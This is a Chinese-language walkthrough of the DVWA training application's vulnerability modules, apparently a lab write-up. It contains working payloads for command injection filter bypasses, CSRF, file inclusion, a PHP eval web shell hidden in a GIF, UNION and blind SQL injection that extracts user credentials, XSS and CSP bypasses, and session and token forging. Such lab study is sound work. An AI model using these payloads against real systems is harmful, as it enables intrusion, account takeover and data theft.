1. [暴力破解](#暴力破解)
2. [CommandInjection](#CommandInjection)
3. [csrf](#csrf)
4. [文件包含](#文件包含)
5. [文件上传](#文件上传)
6. [sql注入](#sql注入)
7. [sql盲注](#sql盲注)
8. [WeakSessionIDs](#WeakSessionIDs)
9. [xss(DOM)](#xss(DOM))
10. [xss(reflected)](#xss(reflected))
11. [xss(stored)](#xss(stored))
12. [Cspbypass](#cspbypass)
13. [javascript](#JavaScript)

# 暴力破解
- low
打开burp,，访问网站，随便输入密码，抓包，然后点击爆破模块，点击清除变量，在需要爆破的密码位置添加变量，导入字典，开始爆破
- medium
因为有个sleep( 2 )函数，所以暴力破解失败的话就会停止两秒钟，破解方法同低
- high
暂未通关,因有token
# CommandInjection
- low
低等级没有做任何过滤，在ip后面跟|,||,&&,&后加需要执行的命令均可以
- medium
过滤代码
    '&&' => '',
    ';'  => '',
仍然可以用&链接需要执行的命令
- high
过滤了以下字符
    '&'  => '',
    ';'  => '',
    '| ' => '',
     '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
    '||' => '',
可以看到|后面还有一个空格，所以依然可以用|连接来绕过
# csrf
- low
没有做任何防护，只需输入两遍密码，把链接直接发给别人或者制作短链接伪装，点击即可成功修改密码
- medium
多了一行代码

    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) )

验证主机是否是服务器，需要写一个html文件在服务器
`<·img src=“http://192.168.1.102/dvwa-master/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#”/>`
打开burp对csrf界面抓包，修改referver地址改为http://攻击者服务器地址/dvwa/被攻击ip地址.html格式，点击go即可完成修改密码
- high
加入了token
# 文件包含
- low

没有任何防护，直接修改文件名即可`?page=../../robots.txt`
- medium

过滤了../,http
    $file = str_replace( array( "http://", "https://" ), "", $file );
    $file = str_replace( array( "../", "..\"" ), "", $file );
可以用绝对路径
 ?page=C:\phpstudy_pro\WWW\d\robots.txt
- high
    if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 
    // This isn't the page we want! 
    echo "ERROR: File not found!"; 
    exit; 
fnmatch方法判断包含的文件是否以file开头，那就可以用file来包含
`?page=file://C:\phpstudy_pro\WWW\d\robots.txt`
# 文件上传
- low

未做任何过滤，直接上传一句话木马即可连接
- medium

只允许上传图片，可以用burp抓包修改后缀文件类型绕过
- high

制作图片马
    GIF89
    `<?php @eval($_POST['gg']);?>  `
上传图片马，使用文件包含
- 也可以hackbar使用post型传参
    gg=system('type C:\1\flag.txt');
# sql注入
- low

字符型
    1' order by 2#

    1' union select 1,2#

    1' union select 1,database()#

    1' union select 1,group_concat(table_schema) from information_schema.schemata#

    1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#

    1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#

    1' union select 1,group_concat(concat_ws(0x2d2d,user,password)) from dvwa.users#
- medium

使用了post注入,直接burp抓包，在id=1 后面直接跟union select查询即可
- high

跟低级别一样
# sql盲注
- low

判断数据库长度
> 1' and length(database())=4#
- ascii码判断第几位是多少
> 1' and ascii(substr(database(),1,1))=100#
- 第一位是v
> 1' and ascii(substr(database(),2,1))=118#
- 第二位是v，最后得到当前使用数据库名称为dvwa
- 猜解当前数据库有多少个表
> 1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
- 当前数据库有两个表
> 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#
-  第一个表长度为9
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#
- 第一个表第一个字母为g
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117#
- 第一个表第二个字母为u，最终guessbook
- 判断第二个表长度
> 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#
- 第二个表长度为5
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117#
- 第二个表第一个字母为u
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115#
- 第二个表第二个字母为s，最终users
- 判断有多少列
> 1’ and (select count(column_name)from information_schema.columns where table_name=‘users’)=8#
- 有8列
> 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7#
 lenth(substr((select column_name from information_schema.columns where table_name='flag' limit 0,1),1))=4#
- 第一列长度为7
> 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=4#
- 第四列长度为3
> 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=117#
- 第四列第一位为u
> 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2))=115#
- 第四列第二个为s，破解得到user
- 爆用户名字段
> 1’ and (select count(user)from users)=5#
- 有五个用户名
> 1' and length(substr((select user from users limit 0,1),1))=5#
- 第一个用户名长度为5
> 1’ and (ascii(substr((select user from users limit 0,1),1,1)))=97#
- 第一个用户名第一个字符为a
> 1’ and (ascii(substr((select user from users limit 0,1),2,1)))=100#
- 第一个用户名第二个字符为d,破解得admin
> 1' and length(substr((select user from users limit 1,1),1))>6#
- 第二个用户名长度为6
> 1’ and (ascii(substr((select user from users limit 1,1),1,1)))=115#
- 第二个用户名第一个字符为s
> 1’ and (ascii(substr((select user from users limit 1,1),2,1)))=109#
- 第二个用户名第二个字符为m,破解得smithy
> 1' and length(substr((select user from users limit 3,1),1))=5#
- 第四个用户名长度为5
> 1' and length(substr((select user from users limit 4,1),1))=6#
- 第五个用户名长度为6
- 基于时间的盲注
> 1’ and sleep(5)#
- 正确，为字符型
- 无论下面结果跳对跳错，只要等待5秒后有反应就说明是正确的
> 1 and sleep(5)#
- 错误，立即跳出
> 1' and if(length(database())=4,sleep(5),1)#
- 判断数据库长度是否为4，如果是，五秒钟后弹出提示,其余同上，只需加在中间即可,sleep()为睡眠的时间
> 1' and if( ,sleep(5),1)#
- medium

数字型注入，方法同上，1 and ....
- high

方法同1，直接输入即可。。
# Weak Session IDs
- low

点击登录，抓包后发现每一次登录，次数都会加一
> dvwaSession=4; security=low; PHPSESSID=1c5a1jijhg3vp4erc1fo9pui6t

复制网址和cookie，打开火狐浏览器，打开hackbar，访问即可成功
- medium

点击登录，抓包，发现时间戳
> dvwaSession=1625031834; security=medium; PHPSESSID=1c5a1jijhg3vp4erc1fo9pui6t

利用时间戳，可以知道什么时候进行的登录，也可构造payload在某一时间进行登录
- high

点击登录，发现有字符串不断变动，md5解码发现是从0开始的md5加密，构造payload直接去hackbar登录即可
> dvwaSession=c4ca4238a0b923820dcc509a6f75849b; security=high; PHPSESSID=1c5a1jijhg3vp4erc1fo9pui6t
# xss(DOM)
- low

未做任何过滤,点击按钮,url可以直接把
`?default=English`
改成
`?default=<script>alert(666)</script>`
- medium

过滤了`<script`

`</option></select><img src=1 onerror=alert(666)>`

- 也可以直接加

`#<script>alert(666)</script>?default=English#<script>alert(666)</script>`

- high

只允许表单内的几个数据
```
?default=English#<script>alert(666)</script>
```
# xss(reflected)
- low

没做任何阿过滤
```
<script>alert(666)</script>
```
- medium

过滤了<script
可以用双写绕过,或者大小写
```
<scr<script>ipt>alert(666)</script>
<Script>alert(666)</Script>
```
## high

过滤了script这六个字符
`$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); `
### 所以使用img标签来绕过
`<img src=1 onerror=alert('666')>`
# xss(stored)
- low

没有使用任何防护
```
<script>alert(666)</script>
```

过滤了<script,可以用双写绕过,或者大小写
```
<scr<script>ipt>alert(666)</script>
<Script>alert(666)</Script>
```
- high
### 过滤了script这六个字符，使用img标签来绕过
` <img src=1 onerror=alert('666')>`
# csp bypass
- low

访问源码中信任的网站，javascript写一个alert方法粘贴网址即可
- medium

查看源码，发现必须配合nonce,构造
```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(666)</script>
```

即可完成
- high

csp页面已经给了提示，要我们通过给出的路径上传文档；使用bp抓包，发现csp头只有一个字段：script-src ‘self’：服务器只信任自己的域名，只允许加载本界面的JavaScript代码，使用firefox，post下列代码
```
include=<script src="source/jsonp.php?callback=alert('hello');"></script>
```
# JavaScript
- low 

源码的意思是先rot13转换再md5加密
` md5(rot13("success"))`

输入success抓包修改最后一行
` token=8b479aefbd90795395b3e7089ae0dc09&phrase=success&send=Submit`

提交即可成功
- medium

changeme点击提交后查看token变成了XXeMegnahCXX，判断是success反序
` XXsseccusXX`

输入success点击提交，抓包，修改
` token=XXsseccusXX&phrase=success&send=Submit`
- high

源码混淆过了，用[这个](http://deobfuscatejavascript.com/) 就可以矫正代码,关键代码
```
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```

hash(“sha256”, hash(“sha256”, “XX” . strrev(“success”)) . “ZZ”)
token是 `ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84`
实在难以理解，没做出来